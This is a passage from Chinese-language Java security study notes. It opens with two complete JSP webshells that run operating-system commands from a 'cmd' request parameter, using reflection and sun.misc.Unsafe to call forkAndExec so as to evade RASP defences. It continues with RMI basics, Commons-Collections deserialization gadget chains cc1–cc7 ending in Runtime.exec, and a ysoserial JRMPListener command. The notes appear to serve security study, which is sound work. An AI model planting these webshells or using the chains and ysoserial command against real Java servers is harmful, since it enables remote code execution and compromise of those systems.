            clazz = Class.forName(unixClass);
        } catch (ClassNotFoundException e) {
            clazz = Class.forName(processClass);
        }

        // 获取UNIXProcess或者ProcessImpl的构造方法
        Constructor<?> constructor = clazz.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        assert strs != null && strs.length > 0;

        // Convert arguments to a contiguous block; it's easier to do
        // memory management in Java than in C.
        byte[][] args = new byte[strs.length - 1][];

        int size = args.length; // For added NUL bytes
        for (int i = 0; i < args.length; i++) {
            args[i] = strs[i + 1].getBytes();
            size += args[i].length;
        }

        byte[] argBlock = new byte[size];
        int    i        = 0;

        for (byte[] arg : args) {
            System.arraycopy(arg, 0, argBlock, i, arg.length);
            i += arg.length + 1;
            // No need to write NUL bytes explicitly
        }

        int[] envc    = new int[1];
        int[] std_fds = new int[]{-1, -1, -1};

        FileInputStream  f0 = null;
        FileOutputStream f1 = null;
        FileOutputStream f2 = null;

        // In theory, close() can throw IOException
        // (although it is rather unlikely to happen here)
        try {
            if (f0 != null) f0.close();
        } finally {
            try {
                if (f1 != null) f1.close();
            } finally {
                if (f2 != null) f2.close();
            }
        }

        // 创建UNIXProcess或者ProcessImpl实例
        Object object = constructor.newInstance(
                toCString(strs[0]), argBlock, args.length,
                null, envc[0], null, std_fds, false
        );

        // 获取命令执行的InputStream
        Method inMethod = object.getClass().getDeclaredMethod("getInputStream");
        inMethod.setAccessible(true);

        return (InputStream) inMethod.invoke(object);
    }

    String inputStreamToString(InputStream in, String charset) throws IOException {
        try {
            if (charset == null) {
                charset = "UTF-8";
            }

            ByteArrayOutputStream out = new ByteArrayOutputStream();
            int                   a   = 0;
            byte[]                b   = new byte[1024];

            while ((a = in.read(b)) != -1) {
                out.write(b, 0, a);
            }

            return new String(out.toByteArray());
        } catch (IOException e) {
            throw e;
        } finally {
            if (in != null)
                in.close();
        }
    }
%>
<%
    String[] str = request.getParameterValues("cmd");

    if (str != null) {
        InputStream in     = start(str);
        String      result = inputStreamToString(in, "UTF-8");
        out.println("<pre>");
        out.println(result);
        out.println("</pre>");
        out.flush();
        out.close();
    }
%>

```

### forkAndExec命令执行-Unsafe+反射+Native方法调用

如果`RASP`把`UNIXProcess/ProcessImpl`类的构造方法拦截,可以通过`Unsafe.allocateInstance`来进行绕过,具体步骤是

1. 使用`sun.misc.Unsafe.allocateInstance(Class)`特性可以无需`new`或者`newInstance`创建`UNIXProcess/ProcessImpl`类对象
2. 反射`UNIXProcess/ProcessImpl`类的`forkAndExec`方法
3. 构造`forkAndExec`需要的参数并调用
4. 反射`UNIXProcess/ProcessImpl`类的`initStreams`方法初始化输入输出结果流对象
5. 反射`UNIXProcess/ProcessImpl`类的`getInputStream`方法获取本地命令执行结果(如果要输出流、异常流反射对应方法即可)

```jsp
// 类Unix下
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="sun.misc.Unsafe" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.Method" %>
<%!
    byte[] toCString(String s) {
        if (s == null)
            return null;
        byte[] bytes  = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0,
                result, 0,
                bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }


%>
<%
    String[] strs = request.getParameterValues("cmd");

    if (strs != null) {
        Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);

        Class processClass = null;

        try {
            processClass = Class.forName("java.lang.UNIXProcess");
        } catch (ClassNotFoundException e) {
            processClass = Class.forName("java.lang.ProcessImpl");
        }

        Object processObject = unsafe.allocateInstance(processClass);

        // Convert arguments to a contiguous block; it's easier to do
        // memory management in Java than in C.
        byte[][] args = new byte[strs.length - 1][];
        int      size = args.length; // For added NUL bytes

        for (int i = 0; i < args.length; i++) {
            args[i] = strs[i + 1].getBytes();
            size += args[i].length;
        }

        byte[] argBlock = new byte[size];
        int    i        = 0;

        for (byte[] arg : args) {
            System.arraycopy(arg, 0, argBlock, i, arg.length);
            i += arg.length + 1;
            // No need to write NUL bytes explicitly
        }

        int[] envc                 = new int[1];
        int[] std_fds              = new int[]{-1, -1, -1};
        Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
        Field helperpathField      = processClass.getDeclaredField("helperpath");
        launchMechanismField.setAccessible(true);
        helperpathField.setAccessible(true);
        Object launchMechanismObject = launchMechanismField.get(processObject);
        byte[] helperpathObject      = (byte[]) helperpathField.get(processObject);

        int ordinal = (int) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);

        Method forkMethod = processClass.getDeclaredMethod("forkAndExec", new Class[]{
                int.class, byte[].class, byte[].class, byte[].class, int.class,
                byte[].class, int.class, byte[].class, int[].class, boolean.class
        });

        forkMethod.setAccessible(true);// 设置访问权限

        int pid = (int) forkMethod.invoke(processObject, new Object[]{
                ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length,
                null, envc[0], null, std_fds, false
        });

        // 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流
        Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
        initStreamsMethod.setAccessible(true);
        initStreamsMethod.invoke(processObject, std_fds);

        // 获取本地执行结果的输入流
        Method getInputStreamMethod = processClass.getMethod("getInputStream");
        getInputStreamMethod.setAccessible(true);
        InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        int                   a    = 0;
        byte[]                b    = new byte[1024];

        while ((a = in.read(b)) != -1) {
            baos.write(b, 0, a);
        }

        out.println("<pre>");
        out.println(baos.toString());
        out.println("</pre>");
        out.flush();
        out.close();
    }
%>

```

## RMI

大概就是

- 创建一个接口 =>继承`Remote`接口
- 创建一个类,`Override`这个接口
- 绑定到地址`LocateRegistry.createRegistry(9999);` `Naming.bind("rmi://192.168.135.142:1099/Hello", helloWorld);`
- 用户端接受`IRemoteHelloWorld helloWorld = (IRemoteHelloWorld) Naming.lookup("rmi://127.0.0.1:9999/Hello");`

流程

> 首先客户端连接Registry，并在其中寻找Name是Hello的对象，这个对应数据流中的Call消息；然后Registry返回一个序列化的数据，这个就是找到的Name=Hello的对象，这个对应数据流中的ReturnData消息；客户端反序列化该对象，发现该对象是一个远程对象，地址在127.0.0.1:9999，于是再与这个地址建立TCP连接。在这个新的连接中，才执行真正远程方法调用，也就是hello()
>
> RMI Registry就像一个网关，他自己是不会执行远程方法的，但RMI Server可以在上面注册一个Name到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server；最后，远程方法实际上在RMI Server上调用。

**接口一定要继承Remote!!!**

## 反序列化

### TransformedMap

用于对Map做一个修饰,被修饰的Map在添加新的元素时,可以执行回调

`Map outerMap = TransformedMap.decorate(innerMap,keyTransformer, valueTransformer);`

keyTransformer是处理新元素的key的回调,valueTransformer是出来新元素的value的回调

### Transformer

Transformer是一个接口

```java
public interface Transformer{
  public Object transform(Object input);
}
```

`TransformedMap`在转换Map的新元素的时候,会调用transform方法,这个过程就类似在调用一个回调函数,参数是原始对象.

### ConstantTransformer

也是实现了Transformer接口的一个类,在构造函数的时候传入一个 对象,并在transform方法将这个对象再返回

```java
public ConstantTransformer(Object constantToReturn){
  super();
  iConstant = constantToReturn;
}
public Object transform(Object input){
 return iConstant; 
}
```

包装任意一个对象，在执行回调时返回这个对象

### InvokerTransformer

实现了Transformer接口的一个类,这个类可以执行任意方法,关键

传入三个参数,第一个是待执行的方法名,第二个是这个函数的参数列表的参数类型,第三个是传给这个函数的参数列表

```java
public InvokerTransformer(String methodName,Class[] paramTypes,Object[] args){
  super();
  iMethodName = methodName;
  iParamTypes = paramTypes;
  iArgs = args;
}
```

后面的回调Transform方法 就是执行了input对象的iMethodName方法

```java
public Object transform(Object input) {
if (input == null) {
    return null;
} try {
    Class cls = input.getClass();
    Method method = cls.getMethod(iMethodName, iParamTypes); 
    return method.invoke(input, iArgs);
} catch (NoSuchMethodException ex) {
    // ...
}
```

## AnnotationInvocationHandler

jdk8u71之前

```java
private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();

        // Check to make sure that types have not evolved incompatibly

        AnnotationType annotationType = null;
        try {
            annotationType = AnnotationType.getInstance(type);
        } catch(IllegalArgumentException e) {
            // Class is no longer an annotation type; time to punch out
            throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map<String, Class<?>> memberTypes = annotationType.memberTypes();

        // If there are annotation members without values, that
        // situation is handled by the invoke method.
        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) {
                    memberValue.setValue(
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
                }
            }
        }
    }

```

核心逻辑就是`Map.Entry<String, Object> memberValue : memberValues.entrySet()`和 `memberValue.setValue(...)`

> memberValues就是反序列化后得到的Map，也是经过了TransformedMap修饰的对象，这里遍历了它的所有元素，并依次设置值。在调用setValue设置值的时候就会触发TransformedMap里注册的 Transform，进而执行我们为其精心设计的任意代码。

```java
AnnotationInvocationHandler.readObject() 
  HashMap.setValue()
    ChainedTransformer.transform()
      ConstantTransformer.transform() // 获取Runtime.class
      InvokerTransformer.transform()   // 获取Runtime.getRuntime
      InvokerTransformer.transform()   // 获取Runtime实例
      InvokerTransformer.transform()   // 调用exec方法触发rce

```

## LazyMap

LazyMap和TransformedMap类似，都来自于Common-Collections库，并继承

AbstractMapDecorator

TransformedMap是在写入元素的时候执 行transform，而LazyMap是在其get方法中执行的 factory.transform

## ysoserial

### JRMP/RMI

本地生成一个payload 打进去 让服务器反序列化一个JRMPClient

`java -cp ysoserial.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections6 'touch /tmp/success'`

## CC链

Cc1-cc7后续再说

idea里有

### cc1

CommonsCollections 3.1 - 3.2.1

JDK版本：1.7 （8u71之后已修复不可利用）

```java
AnnotationInvocationHandler.readObject()
  Proxy.entrySet() // readObject调用了proxy的某些方法，回调invoke
    Proxy.invoke() === AnnotationInvocationHandler.invoke()
      LazyMap.get()
         ChainedTransformer.transform()
          ConstantTransformer.transform() // 获取Runtime.class
          InvokerTransformer.transform()   // 获取Runtime.getRuntime
          InvokerTransformer.transform()   // 获取Runtime实例
          InvokerTransformer.transform()   // 调用exec方法触发rce

```

### cc2

CommonsCollections 3.1 - 3.2.1

JDK版本：1.7 （8u71之后已修复不可利用）

```java
PriorityQueue.readObject()
  PriorityQueue.heapify()
  PriorityQueue.siftDown()
  PriorityQueue.siftDownUsingComparator()
  comparator.compare() === TransformingComparator.compare()
    InvokerTransformer.transform()
      TemplatesImpl.newTransformer()
        TemplatesImpl.getTransletInstance() 
          TemplatesImpl.defineTransletClasses()  // 定义类
        ...  // 创建类实例，触发static代码块

```

### cc3

CommonsCollections 3.1 - 3.2.1

JDK版本：1.7 （8u71之后已修复不可利用）

```java
AnnotationInvocationHandler.readObject()
  Proxy.entrySet() // readObject调用了proxy的某些方法，回调invoke
    Proxy.invoke() === AnnotationInvocationHandler.invoke()
        LazyMap.get()
        ChainedTransformer.transform()
          InvokerTransformer.transform()
          InstantiateTransformer.transform()
          newInstance()
            TrAXFilter#TrAXFilter()
              TemplatesImpl.newTransformer()
                TemplatesImpl.getTransletInstance() 
                  TemplatesImpl.defineTransletClasses()  // 定义类
                ...  // 创建类实例，触发static代码块

```

### cc4

CommonsCollections 4.0

需要 javasist 依赖

```java
PriorityQueue.readObject()
  PriorityQueue.heapify()
  PriorityQueue.siftDown()
  PriorityQueue.siftDownUsingComparator()
  comparator.compare() === TransformingComparator.compare()
    ChainedTransformer.transform()
      InvokerTransformer.transform()
      InstantiateTransformer.transform()
      newInstance()
        TrAXFilter#TrAXFilter()
          TemplatesImpl.newTransformer()
            TemplatesImpl.getTransletInstance() 
              TemplatesImpl.defineTransletClasses()  // 定义类
            ...  // 创建类实例，触发static代码块

```

### cc5

CommonsCollections 3.1 - 3.2.1

```java
BadAttributeValueExpException.readObject()
  valObj.toString() === TiedMapEntry.toString()
    TiedMapEntry.getValue()
      LazyMap.get()
         ChainedTransformer.transform()
          ConstantTransformer.transform() // 获取Runtime.class
          InvokerTransformer.transform()   // 获取Runtime.getRuntime
          InvokerTransformer.transform()   // 获取Runtime实例
          InvokerTransformer.transform()   // 调用exec方法触发rce

```

### cc6

CommonsCollections 3.1 - 3.2.1

```java
HashMap.readObject()
  putForCreate(key) === key.hashCode() === TiedMapEntry.hashCode()
    TiedMapEntry.getValue()
      LazyMap.get()
         ChainedTransformer.transform()
          ConstantTransformer.transform() // 获取Runtime.class
          InvokerTransformer.transform()   // 获取Runtime.getRuntime
          InvokerTransformer.transform()   // 获取Runtime实例
          InvokerTransformer.transform()   // 调用exec方法触发rce

```

### cc7

CommonsCollections 3.1 - 3.2.1

```java
Hashtable.readObject()
  Hashtable.reconstitutionPut()
    org.apache.commons.collections.map.AbstractMapDecorator.equals() === java.util.AbstractMap.equals()
        LazyMap.get()
           ChainedTransformer.transform()
            ConstantTransformer.transform() // 获取Runtime.class
            InvokerTransformer.transform()   // 获取Runtime.getRuntime
            InvokerTransformer.transform()   // 获取Runtime实例
            InvokerTransformer.transform()   // 调用exec方法触发rce

```

## 二次序列化

### SignedObject
